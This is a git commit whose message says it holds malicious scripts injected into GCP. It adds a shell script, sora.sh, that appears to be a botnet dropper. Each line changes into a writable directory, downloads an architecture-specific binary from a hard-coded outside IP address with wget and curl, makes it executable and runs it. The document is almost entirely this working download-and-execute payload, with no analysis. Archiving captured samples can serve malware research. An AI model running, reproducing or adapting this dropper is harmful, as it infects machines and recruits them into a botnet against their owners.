e31e333bd6826cb61ca920e7e342b19ca5c0b5d9
yaojing99 <porsche757@me.com>
2022-05-08 23:56:56 +0800

    两个注入GCP的恶意脚本

---
+++ sora.sh
@@ -0,0 +1,11 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.142.122.27/bins/sora.x86; curl -O http://45.142.122.27/bins/sora.x86;cat sora.x86 >robben;chmod +x *;./robben Payload
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.142.122.27/bins/sora.mips; curl -O http://45.142.122.27/bins/sora.mips;cat sora.mips >robben;chmod +x *;./robben Payload
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.142.122.27/bins/sora.mpsl; curl -O http://45.142.122.27/bins/sora.mpsl;cat sora.mpsl >robben;chmod +x *;./robben Payload
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.142.122.27/bins/sora.arm4; curl -O http://45.142.122.27/bins/sora.arm4;cat sora.arm4 >robben;chmod +x *;./robben Payload
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.142.122.27/bins/sora.arm5; curl -O http://45.142.122.27/bins/sora.arm5;cat sora.arm5 >robben;chmod +x *;./robben Payload
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.142.122.27/bins/sora.arm6; curl -O http://45.142.122.27/bins/sora.arm6;cat sora.arm6 >robben;chmod +x *;./robben Payload
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.142.122.27/bins/sora.arm7; curl -O http://45.142.122.27/bins/sora.arm7;cat sora.arm7 >robben;chmod +x *;./robben Payload
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.142.122.27/bins/sora.ppc; curl -O http://45.142.122.27/bins/sora.ppc;cat sora.ppc >robben;chmod +x *;./robben Payload
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.142.122.27/bins/sora.m68k; curl -O http://45.142.122.27/bins/sora.m68k;cat sora.m68k >robben;chmod +x *;./robben Payload
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.142.122.27/bins/sora.sh4; curl -O http://45.142.122.27/bins/sora.sh4;cat sora.sh4 >robben;chmod +x *;./robben Payload
